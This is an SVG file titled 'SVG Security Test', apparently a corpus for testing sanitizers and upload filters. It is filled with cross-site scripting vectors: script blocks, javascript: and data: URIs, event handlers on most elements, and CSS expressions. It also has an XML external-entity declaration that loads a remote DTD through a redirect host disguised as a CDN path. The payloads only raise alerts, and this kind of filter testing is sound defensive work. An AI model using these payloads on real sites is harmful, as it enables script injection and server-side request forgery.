<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY % test SYSTEM "data:text/plain,alert(1)">
<!ENTITY % external SYSTEM "http://62epax5v6hy2pt353r6jnplx632v34r6jh5vy5xp5co5c33pzvbs26fojnypkbm.mgx26y.302.r3dir.me#@cdn.builder.io/evil.dtd">
%external;
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:ev="http://www.w3.org/2001/xml-events" width="800" height="600" viewBox="0 0 800 600">
  
  <!-- Background -->
  <rect width="100%" height="100%" fill="#f8f8f8"/>
  <text x="20" y="30" font-family="Verdana" font-size="20" fill="#333">SVG Security Test</text>
  
  <!-- Direct Script Blocks -->
  <script type="text/ecmascript">
    <![CDATA[
      try { alert('Direct Script 1'); } catch(e) {}
      //]]><![CDATA[
      try { alert('Direct Script 2'); } catch(e) {}
    ]]>
  </script>
  
  <script type="text/javascript">
    //<![CDATA[
    try { alert('CDATA Script'); } catch(e) {}
    //]]>
  </script>
  
  <!-- Script via href -->
  <script type="application/ecmascript" xlink:href="data:application/javascript,alert('Href Script')"/>
  <script type="text/javascript" href="data:text/javascript,alert('Href Script2')"/>
  
  <!-- Image with various protocols -->
  <image xlink:href="javascript:alert('JS Protocol')" x="20" y="50" width="100" height="50"/>
  <image xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ0RhdGEgVVJJJyk8L3NjcmlwdD48L3N2Zz4=" x="20" y="110" width="100" height="50"/>
  <image xlink:href="vbscript:msgbox('VBScript')" x="20" y="170" width="100" height="50"/>
  
  <!-- JavaScript Links -->
  <a xlink:href="javascript:alert('Link JS1')">
    <text x="20" y="240" font-family="Verdana" font-size="12" fill="blue" text-decoration="underline">JS Link 1</text>
  </a>
  <a xlink:href="j a v a s c r i p t:alert('Obfuscated JS')">
    <text x="20" y="260" font-family="Verdana" font-size="12" fill="blue" text-decoration="underline">Obfuscated Link</text>
  </a>
  <a xlink:href="data:text/html,<script>alert('Data HTML')</script>">
    <text x="20" y="280" font-family="Verdana" font-size="12" fill="blue" text-decoration="underline">Data HTML Link</text>
  </a>
  
  <!-- ForeignObject with full HTML capabilities -->
  <foreignObject x="150" y="40" width="400" height="300">
    <html xmlns="http://www.w3.org/1999/xhtml">
      <head>
        <meta http-equiv="refresh" content="0;url=javascript:alert('Meta Refresh')"/>
        <title onload="alert('Title Load')">Test</title>
        <style>
          @import url('javascript:alert("CSS Import")');
          body { background: url('javascript:alert("CSS Background")'); }
        </style>
        <base href="javascript:alert('Base Href')"/>
      </head>
      <body onload="alert('Body Load')" onunload="alert('Body Unload')" onpageshow="alert('Page Show')">
        <!-- Direct HTML Script -->
        <script>alert('HTML Script')</script>
        <script src="data:text/javascript,alert('HTML Script Src')"></script>
        
        <!-- Image Events -->
        <img src="x" onerror="alert('HTML Image Error')" width="100" height="50"/>
        <img src="javascript:alert('HTML JS Image')" width="100" height="50"/>
        <img dynsrc="javascript:alert('HTML DynSrc')" width="100" height="50"/>
        <img lowsrc="javascript:alert('HTML LowSrc')" width="100" height="50"/>
        
        <!-- Form Actions -->
        <form action="javascript:alert('Form Action')" method="post">
          <input type="submit" value="Submit Form"/>
        </form>
        <form name="test" onsubmit="alert('Form Submit')">
          <input type="submit" value="Submit Form 2"/>
        </form>
        
        <!-- Iframe/Frame -->
        <iframe src="javascript:alert('Iframe Src')" width="200" height="50"></iframe>
        <frame src="javascript:alert('Frame Src')"/>
        <embed src="javascript:alert('Embed Src')" width="100" height="50"/>
        <object data="javascript:alert('Object Data')" width="100" height="50"></object>
        
        <!-- Link Events -->
        <a href="javascript:alert('HTML Link')">HTML JS Link</a>
        <a href="data:text/html,<script>alert('Data URI')</script>">Data URI Link</a>
        
        <!-- Button Events -->
        <button onclick="alert('Button Click')">Click Button</button>
        <input type="button" value="Input Button" onclick="alert('Input Click')"/>
        
        <!-- Event Handlers -->
        <div onmouseover="alert('Mouse Over')" onclick="alert('Div Click')" ondblclick="alert('Double Click')">Hover/Click Me</div>
        
        <!-- CSS Expressions (IE) -->
        <div style="width: expression(alert('CSS Expression'))">CSS Test</div>
        
        <!-- Marquee -->
        <marquee onstart="alert('Marquee Start')" width="100">Scrolling</marquee>
        
        <!-- Video/Audio -->
        <video src="x" onerror="alert('Video Error')" width="100" height="50"></video>
        <audio src="x" onerror="alert('Audio Error')" controls></audio>
        
        <!-- Details -->
        <details ontoggle="alert('Details Toggle')">
          <summary>Click me</summary>
          Content
        </details>
        
        <!-- Dialog -->
        <dialog open onclose="alert('Dialog Close')">Dialog</dialog>
        
        <!-- MathML -->
        <math xmlns="http://www.w3.org/1998/Math/MathML" onclick="alert('MathML Click')">
          <mi onclick="alert('MathMI Click')">x</mi>
        </math>
      </body>
    </html>
  </foreignObject>
  
  <!-- Animation Events -->
  <rect x="20" y="320" width="80" height="80" fill="red" id="animRect">
    <animate attributeName="x" from="20" to="100" dur="2s" begin="0s" onbegin="alert('Anim Begin')" onend="alert('Anim End')" onrepeat="alert('Anim Repeat')"/>
    <animate attributeName="width" from="80" to="120" begin="animRect.click" onbegin="alert('Click Anim')"/>
    <animateColor attributeName="fill" from="red" to="blue" begin="mouseover" onbegin="alert('Color Anim')"/>
  </rect>
  
  <!-- Set Element Events -->
  <rect x="120" y="320" width="60" height="60" fill="green" id="setRect"/>
  <set attributeName="onclick" to="alert('Set Click')" begin="setRect.click" dur="indefinite"/>
  <set attributeName="onmouseover" to="alert('Set Hover')" begin="setRect.mouseover" dur="indefinite"/>
  
  <!-- Use Element with Events -->
  <g id="clickGroup" onclick="alert('Group Click')" onmouseover="alert('Group Hover')">
    <rect x="200" y="320" width="70" height="70" fill="orange"/>
    <text x="205" y="365" font-size="10" fill="white">Group</text>
  </g>
  <use xlink:href="#clickGroup" x="0" y="0"/>
  
  <!-- ClipPath Events -->
  <clipPath id="myClip" onload="alert('ClipPath Load')">
    <circle cx="300" cy="360" r="40"/>
  </clipPath>
  <rect x="260" y="320" width="80" height="80" fill="purple" clip-path="url(#myClip)"/>
  
  <!-- Pattern Events -->
  <pattern id="myPattern" onload="alert('Pattern Load')" width="20" height="20" patternUnits="userSpaceOnUse">
    <circle cx="10" cy="10" r="8" fill="cyan"/>
  </pattern>
  <rect x="350" y="320" width="80" height="80" fill="url(#myPattern)"/>
  
  <!-- Gradient Events -->
  <linearGradient id="myGradient" onload="alert('Gradient Load')">
    <stop offset="0%" stop-color="red" onbegin="alert('Gradient Stop')"/>
    <stop offset="100%" stop-color="yellow"/>
  </linearGradient>
  <rect x="440" y="320" width="80" height="80" fill="url(#myGradient)"/>
  
  <!-- Mask Events -->
  <mask id="myMask" onload="alert('Mask Load')">
    <rect width="100%" height="100%" fill="white"/>
  </mask>
  <rect x="530" y="320" width="80" height="80" fill="teal" mask="url(#myMask)"/>
  
  <!-- Symbol Events -->
  <symbol id="mySymbol" onload="alert('Symbol Load')" viewBox="0 0 50 50">
    <circle cx="25" cy="25" r="20" fill="pink"/>
  </symbol>
  <use xlink:href="#mySymbol" x="620" y="320" width="50" height="50"/>
  
  <!-- Marker Events -->
  <marker id="myMarker" onload="alert('Marker Load')" markerWidth="10" markerHeight="10" refX="5" refY="5">
    <circle cx="5" cy="5" r="4" fill="brown"/>
  </marker>
  <path d="M 20,450 L 100,450" stroke="black" stroke-width="2" marker-start="url(#myMarker)"/>
  
  <!-- Filter Events -->
  <filter id="myFilter" onload="alert('Filter Load')">
    <feGaussianBlur in="SourceGraphic" stdDeviation="5"/>
  </filter>
  <rect x="120" y="420" width="60" height="60" fill="navy" filter="url(#myFilter)"/>
  
  <!-- CSS in SVG -->
  <style type="text/css">
    <![CDATA[
      @import url('javascript:alert("SVG CSS Import")');
      .test { fill: url('javascript:alert("SVG CSS URL")'); }
      #cssRect { fill: expression(alert("CSS Expression")); }
    ]]>
  </style>
  <rect class="test" x="200" y="420" width="60" height="60"/>
  
  <!-- Handler (SVG 2.0) -->
  <handler type="application/ecmascript" ev:event="click">alert('Handler Event')</handler>
  <rect x="280" y="420" width="60" height="60" fill="lime"/>
  
  <!-- Metadata with scripts -->
  <metadata>
    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
             xmlns:dc="http://purl.org/dc/elements/1.1/">
      <dc:description>
        <script>alert('RDF Script')</script>
      </dc:description>
    </rdf:RDF>
    <!--<?xml-stylesheet type="text/xsl" href="javascript:alert('XSL')"?>-->
  </metadata>
  
  <!-- Desc and Title with scripts -->
  <desc><script>alert('Desc Script')</script></desc>
  <title><script>alert('Title Script')</script></title>
  
  <!-- Text with events -->
  <text x="20" y="420" font-family="Verdana" font-size="14" fill="darkred" onclick="alert('Text Click')" onmouseover="alert('Text Hover')">Interactive Text</text>
  
  <!-- Path with events -->
  <path d="M 360,420 L 440,420 L 400,380 Z" fill="gold" onclick="alert('Path Click')" onmouseover="alert('Path Hover')"/>
  
  <!-- Circle with events -->
  <circle cx="500" cy="450" r="30" fill="silver" onclick="alert('Circle Click')" onload="alert('Circle Load')"/>
  
  <!-- Ellipse with events -->
  <ellipse cx="580" cy="450" rx="40" ry="25" fill="coral" onclick="alert('Ellipse Click')"/>
  
  <!-- Line with events -->
  <line x1="640" y1="420" x2="720" y2="480" stroke="gray" stroke-width="3" onclick="alert('Line Click')"/>
  
  <!-- Polygon with events -->
  <polygon points="650,500 700,500 725,550 675,580 625,550" fill="orchid" onclick="alert('Polygon Click')"/>
  
  <!-- Polyline with events -->
  <polyline points="500,500 550,520 600,500 650,530" fill="none" stroke="green" stroke-width="2" onclick="alert('Polyline Click')"/>
  
  <!-- Nested SVG with events -->
  <svg x="20" y="500" width="100" height="80" viewBox="0 0 100 80" onload="alert('Nested SVG Load')">
    <rect width="100%" height="100%" fill="lightblue" onclick="alert('Nested Rect Click')"/>
    <text x="10" y="40" font-size="12">Nested SVG</text>
  </svg>
  
  <!-- Switch with events -->
  <switch onload="alert('Switch Load')">
    <text x="140" y="540" font-family="Verdana" font-size="12">Switch Content</text>
  </switch>
  
  <!-- View with events -->
  <view id="myView" onload="alert('View Load')"/>
  
  <!-- Script in comments -->
  <!--<script>alert('Comment Script')</script>-->
  
  <!-- CDATA in unexpected places -->
  <text x="240" y="540">
    <![CDATA[<script>alert('CDATA Text')</script>]]>
  </text>
  
  <!-- Entity references -->
  <text x="20" y="580">&lt;script&gt;alert('Entity')&lt;/script&gt;</text>
  
  <!-- Multiple namespaces -->
  <svg:svg xmlns:svg="http://www.w3.org/2000/svg">
    <svg:script>alert('Namespace Script')</svg:script>
  </svg:svg>
  
  <!-- Style attribute with expressions -->
  <rect x="400" y="500" width="50" height="50" style="fill: expression(alert('Style Expression'))"/>
  
  <!-- Event attributes on all possible elements -->
  <defs onload="alert('Defs Load')">
    <rect id="defRect" width="10" height="10" fill="black"/>
  </defs>
  
  <g onload="alert('G Load')" transform="translate(500,500)">
    <rect width="30" height="30" fill="darkgreen"/>
  </g>
  
  <!-- All possible event types -->
  <rect x="550" y="500" width="40" height="40" fill="darkblue"
        onfocusin="alert('Focus In')"
        onfocusout="alert('Focus Out')" 
        onactivate="alert('Activate')"
        onclick="alert('Click')"
        onmousedown="alert('Mouse Down')"
        onmouseup="alert('Mouse Up')"
        onmouseover="alert('Mouse Over')"
        onmousemove="alert('Mouse Move')"
        onmouseout="alert('Mouse Out')"
        onload="alert('Rect Load')"
        onunload="alert('Rect Unload')"
        onabort="alert('Abort')"
        onerror="alert('Error')"
        onresize="alert('Resize')"
        onscroll="alert('Scroll')"
        onzoom="alert('Zoom')"/>
  
  <!-- SVG 2.0 features -->
  <textarea x="620" y="500" width="100" height="30" oninput="alert('Textarea Input')">Type here</textarea>
  
</svg>
